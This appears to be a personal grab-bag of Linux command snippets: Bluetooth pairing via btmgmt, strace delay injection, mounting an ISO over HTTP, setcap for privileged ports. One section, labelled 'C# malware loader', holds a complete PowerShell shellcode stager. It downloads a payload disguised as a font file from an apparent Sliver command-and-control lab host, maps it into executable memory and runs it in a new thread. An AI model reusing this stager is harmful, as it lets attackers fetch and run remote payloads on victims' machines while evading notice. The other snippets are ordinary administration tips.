# Random stuff

## Bt cli connect/LE

> From kde ru telegram

```
sudo btmgmt power off
sudo btmgmt discov on
sudo btmgmt connectable on
sudo btmgmt pairable on
sudo btmgmt power on
pair {mac моих наушников}


Наушники подключаются в режиме LE, можно увидеть с помощью команды hcitool, но без звука, в панели громкости kde в качестве устройства для вывода не появляются, но как только дописывают
вместо pair, connect {MAC}, то теперь и LE и ACL можно увидеть через hcitool, до этих махинация только ACL всегда было
```

## C# malware loader

siren: also since psh is a fucking C# interpreter you might as well use it to execute a proper stager

```
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
[DllImport("kernel32")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect);
[DllImport("kernel32", CharSet=CharSet.Ansi)]
public static extern IntPtr CreateThread(
    IntPtr lpThreadAttributes,
    uint dwStackSize,
    IntPtr lpStartAddress,
    IntPtr lpParameter,
    uint dwCreationFlags,
    IntPtr lpThreadId);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern UInt32 WaitForSingleObject(
    IntPtr hHandle,
    UInt32 dwMilliseconds);
}
"@
Add-Type $Win32

$shellcode = (New-Object System.Net.WebCLient).DownloadData("http://sliver.labnet.local/fontawesome.woff")
if ($shellcode -eq $null) {Exit};
$size = $shellcode.Length

[IntPtr]$addr = [Win32]::VirtualAlloc(0,$size,0x1000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
$thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);
[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

## Strace inject

strace -e inject=fdatasync:delay_enter=10000000 dolphin

## Mount iso

> From: https://aur.archlinux.org/packages/ttf-ms-win10-auto

echo "  - Mounting HTTP file"
httpfs2 -c /dev/null "$_iso" mnt/http
echo "  - Creating loop device"
_isoFile="mnt/http/$(echo "$_iso" | awk -F "/" '{print $NF}')"
_loopDev=$(udisksctl loop-setup -r -f "${_isoFile}" --no-user-interaction 2>/dev/null | awk '{print $NF}')
_loopDev=$(losetup --list | grep "$_isoFile" | awk '{print $1}')
echo "  - Mounting loop device: $_loopDev"
_mountpoint=$(udisksctl mount -t udf -b "$_loopDev" --no-user-interaction | awk '{print $NF}')
echo "  - Loop device mounted as ISO at: $_mountpoint"

## Bash redirect all stdout 🙃

exec 1> >(ccze -A)

## Unpriviliged ports

setcap 'cap_net_bind_service=+ep' /path/to/program

## Images
https://pomf2.lain.la/f/0hvkp6v.tar.gz
